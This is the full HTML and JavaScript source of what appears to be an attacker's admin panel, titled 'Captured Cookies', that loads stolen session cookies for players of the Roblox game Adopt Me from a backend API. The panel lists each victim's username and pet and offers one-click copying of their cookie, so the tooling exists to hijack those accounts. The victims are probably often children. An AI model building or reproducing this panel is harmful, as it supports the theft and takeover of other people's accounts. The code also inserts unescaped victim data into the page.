<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Captured Cookies</title>
  <style>
    :root { --bg:#0d1117; --surface:#161b22; --border:rgba(255,255,255,0.06); --text:#c9d1d9; --pink:#d6336c; }
    body { font-family: 'Segoe UI', sans-serif; background:var(--bg); color:var(--text); display:flex; justify-content:center; min-height:100vh; padding:24px; }
    .container { width:100%; max-width:1000px; }
    .header { display:flex; align-items:center; justify-content:space-between; margin-bottom:28px; }
    .header h1 { font-size:26px; color:#fff; }
    .logout-btn { background:var(--pink); border:none; padding:8px 20px; border-radius:20px; color:#fff; font-weight:600; cursor:pointer; text-decoration:none; }
    .card { background:var(--surface); border:1px solid var(--border); border-radius:18px; padding:22px; }
    .entry { display:flex; align-items:center; justify-content:space-between; padding:14px 0; border-bottom:1px solid var(--border); gap:16px; flex-wrap:wrap; }
    .entry:last-child { border-bottom:none; }
    .entry-info strong { color:#fff; font-size:15px; }
    .entry-info span { font-size:12px; color:#8b949e; }
    .cookie-box { font-family:monospace; font-size:13px; color:#c9d1d9; background:#0d1117; padding:6px 10px; border-radius:6px; max-width:280px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
    .copy-btn { background:#21262d; border:1px solid #30363d; color:#c9d1d9; padding:6px 14px; border-radius:8px; cursor:pointer; font-size:12px; font-weight:600; }
    .copy-btn:hover { background:#30363d; }
    .refresh-btn { background:var(--pink); border:none; padding:8px 18px; border-radius:20px; color:#fff; font-weight:600; cursor:pointer; }
    .empty { text-align:center; color:#8b949e; padding:60px 0; font-size:16px; }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <h1>Captured Cookies</h1>
      <div>
        <button class="refresh-btn" onclick="loadData()">🔄 Refresh</button>
        <a href="/logout" class="logout-btn">Logout</a>
      </div>
    </div>
    <div class="card" id="content">Loading...</div>
  </div>

  <script>
    async function loadData() {
      document.getElementById('content').innerHTML = 'Loading...';
      try {
        const res = await fetch('/api/cookies');
        if (res.status === 401) { window.location.href = '/login'; return; }
        const allData = await res.json();
        const adoptme = allData.adoptme || [];
        const container = document.getElementById('content');
        if (!adoptme.length) { container.innerHTML = '<div class="empty">No cookies captured yet.</div>'; return; }
        let html = '';
        adoptme.forEach(entry => {
          const petInfo = entry.pet || '---';
          html += `<div class="entry">
            <div class="entry-info">
              <strong>${entry.username}</strong>
              <span>Pet: ${petInfo}</span>
            </div>
            <div class="cookie-box" title="${entry.cookie}">${(entry.cookie || '').substring(0, 50)}...</div>
            <button class="copy-btn" data-cookie="${entry.cookie.replace(/"/g, '&quot;')}">📋 Copy</button>
          </div>`;
        });
        container.innerHTML = html;
        document.querySelectorAll('.copy-btn').forEach(btn => {
          btn.addEventListener('click', () => {
            navigator.clipboard.writeText(btn.getAttribute('data-cookie')).then(() => {
              btn.textContent = '✔ Copied';
              setTimeout(() => btn.textContent = '📋 Copy', 2000);
            });
          });
        });
      } catch (err) {
        document.getElementById('content').innerHTML = '<div class="empty">Could not connect to server.</div>';
      }
    }
    loadData();
  </script>
</body>
</html>
